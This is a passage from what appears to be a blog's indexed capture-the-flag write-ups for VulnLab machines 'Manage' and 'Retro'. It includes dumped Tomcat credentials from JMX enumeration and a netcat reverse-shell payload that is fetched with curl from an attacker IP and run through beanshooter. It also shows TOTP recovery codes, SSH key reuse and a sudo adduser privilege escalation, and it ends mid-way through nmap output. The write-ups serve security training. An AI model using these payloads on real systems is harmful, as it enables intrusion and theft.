(Catalina:type=NamingResources,host=localhost,context=/host-manager)\n[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HostManager,J2EEApplication=none,J2EEServer=none)\n[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)\n\n[...SNIP...]\n\n[+]       - org.apache.catalina.mbeans.UserMBean (Users:type=User,username=\"manager\",database=UserDatabase)\n[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=responsetrailer,J2EEApplication=none,J2EEServer=none)\n[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=JMXProxy,J2EEApplication=none,J2EEServer=none)\n[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=HTMLManager,J2EEApplication=none,J2EEServer=none)\n[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/)\n[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/bar/name2)\n[+]       - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:type=DiagnosticCommand) (action: diagnostic)\n[+]\n[+] Enumerating tomcat users:\n[+]\n[+]     - Listing 2 tomcat users:\n[+]\n[+]             ----------------------------------------\n[+]             Username:  manager\n[+]             Password:  fhErvo2r9wuTEYiYgt\n[+]             Roles:\n[+]                        Users:type=Role,rolename=\"manage-gui\",database=UserDatabase\n[+]\n[+]             ----------------------------------------\n[+]             Username:  admin\n[+]             Password:  onyRPCkaG4iX72BrRtKgbszd\n[+]             Roles:\n[+]                        Users:type=Role,rolename=\"role1\",database=UserDatabase\n</code></pre> <p>After looking through the documentation, it's possible to get code execution by leveraging the <code>standard</code> MBean to execute commands on the server.</p> <p>There are probably multiple ways to do this, but I put the following payload in a file and saved it as <code>shell.sh</code></p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.8.2.86 9001 &gt;/tmp/f\n</code></pre> <p>We can use <code>beanshooter</code> to grab the <code>shell.sh</code> file from our attacker machine. Please note that I have an alias set up for 'beanshooter' that runs the JAR file. </p> <pre><code>\u279c  manage $ beanshooter standard $ip 2222 exec 'curl http://10.8.2.86:8000/shell.sh -o /dev/shm/shell.sh'\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[+] Creating a TemplateImpl payload object to abuse StandardMBean\n[+]\n[+]     Deplyoing MBean: StandardMBean\n[+]     MBean with object name de.qtc.beanshooter:standard=4573249368457 was successfully deployed.\n[+]\n[+]     Caught NullPointerException while invoking the newTransformer action.\n[+]     This is expected bahavior and the attack most likely worked :)\n[+]\n[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=4573249368457 from the MBeanServer.\n[+]     MBean was successfully removed.\n</code></pre> <p>Once the <code>shell.sh</code> file is on the target machine we can execute it with the following:</p> <pre><code>\u279c  manage $ beanshooter standard $ip 2222 exec 'sh /dev/shm/shell.sh'\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[+] Creating a TemplateImpl payload object to abuse StandardMBean\n[+]\n[+]     Deplyoing MBean: StandardMBean\n[+]     MBean with object name de.qtc.beanshooter:standard=4794690013321 was successfully deployed.\n[+]\n[+]     Caught NullPointerException while invoking the newTransformer action.\n[+]     This is expected bahavior and the attack most likely worked :)\n[+]\n[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=4794690013321 from the MBeanServer.\n[+]     MBean was successfully removed.\n</code></pre> <p>When that runs we get a shell as the <code>tomcat</code> user and can grab the <code>user.txt</code> flag from the <code>/opt/tomcat</code> directory. </p>","tags":["Java-RMI","linux","sudo"]},{"location":"blog/2024/06/28/vulnlab-manage.html#lateral-movement","title":"Lateral Movement","text":"<p>Looking around the file system, we find a backups directory in the <code>/home/useradmin</code> folder. </p> <pre><code>tomcat@manage:/home/useradmin/backups$ ls -la\nls -la\ntotal 12\ndrwxrwxr-x 2 useradmin useradmin 4096 Jun 21 16:51 .\ndrwxr-xr-x 5 useradmin useradmin 4096 Jun 21 16:51 ..\n-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21 16:50 backup.tar.gz\n</code></pre> <p>We can transfer that <code>bacckup.tar.gz</code> file over to our attacker machine and extract it. once we've done that, we find what appears to be a backup of the <code>useradmin</code> home directory. </p> <pre><code>\u279c  backups $ ls -la\ntotal 22\ndrwxrwxrwx 1 root root 4096 Jun 21 11:48 .\ndrwxrwxrwx 1 root root 4096 Jun 28 16:49 ..\ndrwxrwxrwx 1 root root    0 Jun 21 11:48 .cache\ndrwxrwxrwx 1 root root 4096 Jun 21 10:53 .ssh\n-rwxrwxrwx 1 root root  220 Jun 21 10:46 .bash_logout\n-rwxrwxrwx 1 root root 3771 Jun 21 10:46 .bashrc\n-r-xr-xr-x 1 root root  200 Jun 21 11:48 .google_authenticator\n-rwxrwxrwx 1 root root  807 Jun 21 10:46 .profile\n-rwxrwxrwx 1 root root 3088 Jun 21 11:50 backup.tar.gz\n</code></pre> <p>That <code>.google_authenticator</code> file looks interesting. Checking that out, it seems to contain some backup codes and maybe a secret to set up Google Authenticator for generating Time-based One-Time Passwords (TOTP). Set this aside for now; we'll need these later on.</p> <pre><code>\u279c  backups $ cat .google_authenticator\nCLSSSMHYGLENX5HAIFBQ6L35UM\n\" RATE_LIMIT 3 30 1718988529\n\" WINDOW_SIZE 3\n\" DISALLOW_REUSE 57299617\n\" TOTP_AUTH\n99852083\n20312647\n73235136\n92971994\n86175591\n98991823\n54032641\n69267218\n76839253\n56800775\n</code></pre> <p>Checking the <code>.ssh</code> directory, we find a private key. </p> <pre><code>\u279c  .ssh $ ls -la\ntotal 10\ndrwxrwxrwx 1 root root 4096 Jun 21 10:53 .\ndrwxrwxrwx 1 root root 4096 Jun 21 11:48 ..\n-rwxrwxrwx 1 root root   98 Jun 21 10:56 authorized_keys\n-rwxrwxrwx 1 root root  411 Jun 21 10:53 id_ed25519\n-rwxrwxrwx 1 root root   98 Jun 21 10:53 id_ed25519.pub\n</code></pre> <p>When trying to ssh using the key, we get prompted for a verification code. Grab one of the recovery codes from the <code>.google_authenticator</code> file and use that here. </p> <pre><code>\u279c  .ssh $ ssh -i id_ed25519 useradmin@$ip\nThe authenticity of host '10.10.93.168 (10.10.93.168)' can't be established.\nED25519 key fingerprint is SHA256:mTJofQVp4T/1uO1CFsfPt8SADZfjbzIIynR0Zeqi0qo.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:1: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.93.168' (ED25519) to the list of known hosts.\n(useradmin@10.10.93.168) Verification code:\nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Fri Jun 28 10:12:35 PM UTC 2024\n\n  System load:  0.0               Processes:             111\n  Usage of /:   74.4% of 6.06GB   Users logged in:       0\n  Memory usage: 39%               IPv4 address for ens5: 10.10.93.168\n  Swap usage:   0%\n\n * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s\n   just raised the bar for easy, resilient and secure K8s cluster deployment.\n\n   https://ubuntu.com/engage/secure-kubernetes-at-the-edge\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Fri Jun 21 16:48:53 2024 from 192.168.94.139\nuseradmin@manage:~$\n</code></pre>","tags":["Java-RMI","linux","sudo"]},{"location":"blog/2024/06/28/vulnlab-manage.html#privilege-escalation","title":"Privilege Escalation","text":"<p>Checking to see what the <code>useradmin</code> user can run as root, we see that we're able to run <code>adduser</code>, but we're limited to alphanumeric characters, so no passing arguments like <code>--uid</code>. </p> <pre><code>useradmin@manage:~$ sudo -l\nMatching Defaults entries for useradmin on manage:\n    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser useradmin may run the following commands on manage:\n    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$\n</code></pre> <p>We're given a hint on this box to look at the default Ubuntu sudoers file. When we do, we see that members of the <code>admin</code> group may gain root privileges</p> <pre><code># Members of the admin group may gain root privileges\n%admin ALL=(ALL) ALL\n</code></pre> <p>Since we know that when a new user is created, a matching group is created (by default), if we add an <code>admin</code> user, then the <code>admin</code> group should be added and the <code>admin</code> user will be added automatically. </p> <pre><code>useradmin@manage:~$ sudo /usr/sbin/adduser admin\nAdding user `admin' ...\nAdding new group `admin' (1003) ...\nAdding new user `admin' (1003) with group `admin' ...\nCreating home directory `/home/admin' ...\nCopying files from `/etc/skel' ...\nNew password:\nRetype new password:\npasswd: password updated successfully\nChanging the user information for admin\nEnter the new value, or press ENTER for the default\n        Full Name []: Admin\n        Room Number []:\n        Work Phone []:\n        Home Phone []:\n        Other []:\nIs the information correct? [Y/n]\n</code></pre> <p>After switching to the admin user and running <code>sudo -l</code> again, we see that we can run any command as root.</p> <pre><code>admin@manage:/home/useradmin$ sudo -l\n[sudo] password for admin:\nMatching Defaults entries for admin on manage:\n    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser admin may run the following commands on manage:\n    (ALL) ALL\n</code></pre> <p>We can use <code>sudo su</code> to become root and grab the root flag. </p> <pre><code>root@manage:~# ls -la\ntotal 40\ndrwx------  6 root root 4096 Jun 22 15:15 .\ndrwxr-xr-x 19 root root 4096 Mar  1 04:20 ..\nlrwxrwxrwx  1 root root    9 Jun 21 16:52 .bash_history -&gt; /dev/null\n-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc\ndrwx------  2 root root 4096 Mar  1 20:14 .cache\n-r--------  1 root root  200 Jun 22 15:12 .google_authenticator\ndrwxr-xr-x  3 root root 4096 Jun 21 15:19 .local\n-rw-r--r--  1 root root  161 Jul  9  2019 .profile\n-rw-r--r--  1 root root   37 Mar  1 07:29 root.txt\ndrwx------  3 root root 4096 Mar  1 04:23 snap\ndrwx------  2 root root 4096 Jun 21 15:26 .ssh\n-rw-r--r--  1 root root    0 Mar  1 04:35 .sudo_as_admin_successful\n</code></pre>","tags":["Java-RMI","linux","sudo"]},{"location":"blog/2024/07/04/vulnlab-retro.html","title":"VulnLab: Retro","text":"<p>Retro is an EASY rated machine on VulnLab. This machine involves abusing a flaw with pre-created computer accounts to change a password and take over control of the account. From there, abuse an AD CS misconfiguration to obtain a certificate as a domain administrator that can be used for authentication to the domain controller. </p> <p></p>","tags":["adcs","pre-created-computer-accounts"]},{"location":"blog/2024/07/04/vulnlab-retro.html#enumeration","title":"Enumeration","text":"","tags":["adcs","pre-created-computer-accounts"]},{"location":"blog/2024/07/04/vulnlab-retro.html#nmap","title":"Nmap","text":"<pre><code>PORT      STATE SERVICE       REASON  VERSION\n53/tcp    open  domain        syn-ack Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-07-04 15:04:07Z)\n135/tcp   open  msrpc         syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl\n| Issuer: commonName=retro-DC-CA/domainComponent=retro\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-04T14:45:48\n| Not valid after:  2025-07-04T14:45:48\n| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3\n| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb\n| -----BEGIN CERTIFICATE-----\n| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF\n| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU\n| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0\n| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD\n| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2\n| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx\n| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd\n| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8\n| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H\n| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG\n| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV\n| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG\n| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg\n| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw\n| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ\n| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t\n| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB\n| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO\n| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl\n| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2\n| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu\n| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y\n| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049\n| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp\n| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO\n| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0\n| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC\n| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw\n| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1\n| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+\n| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy\n| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx\n| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a\n| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98\n| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B\n| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX\n| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd\n| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==\n|_-----END CERTIFICATE-----\n445/tcp   open  microsoft-ds? syn-ack\n464/tcp   open  kpasswd5?     syn-ack\n593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl\n| Issuer: commonName=retro-DC-CA/domainComponent=retro\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-04T14:45:48\n| Not valid after:  2025-07-04T14:45:48\n| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3\n| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb\n| -----BEGIN CERTIFICATE-----\n| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF\n| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU\n| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0\n| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD\n| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2\n| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx\n| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd\n| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8\n| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H\n| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG\n| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV\n| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG\n| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg\n| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw\n| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ\n| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t\n| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB\n| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO\n| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl\n| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2\n| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu\n| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y\n| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049\n| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp\n| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO\n| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0\n| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC\n| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw\n| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1\n| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+\n| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy\n| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx\n| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a\n| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98\n| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B\n| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX\n| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd\n| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==\n|_-----END CERTIFICATE-----\n|_ssl-date: TLS randomness does not represent time\n3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl\n| Issuer: commonName=retro-DC-CA/domainComponent=retro\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-04T14:45:48\n| Not valid after:  2025-07-04T14:45:48\n| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3\n| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb\n| -----BEGIN CERTIFICATE-----\n| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF\n| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU\n| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0\n| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD\n| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2\n| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx\n| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd\n| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8\n| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H\n| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG\n| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV\n| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG\n| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg\n| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw\n| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ\n| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t\n| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB\n| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO\n| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl\n| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2\n| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu\n| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y\n| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049\n| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp\n| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO\n| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0\n| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC\n| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw\n| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1\n| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+\n| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy\n| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx\n| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a\n| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98\n| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B\n| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX\n| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd\n| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==\n|_-----END CERTIFICATE-----\n3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services\n|_ssl-date: 2024-07-04T15:04:55+00:00; -1s from scanner time.\n| rdp-ntlm-info:\n|   Target_Name: RETRO\n|   NetBIOS_Domain_Name: RETRO\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: retro.vl\n|   DNS_Computer_Name: DC.retro.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-07-04T15:04:15+00:00\n| ssl-cert: Subject: commonName=DC.retro.vl\n| Issuer: commonName=DC.retro.vl\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-03T14:54:33\n| Not valid after:  2025-01-02T14:54:33\n| MD5:   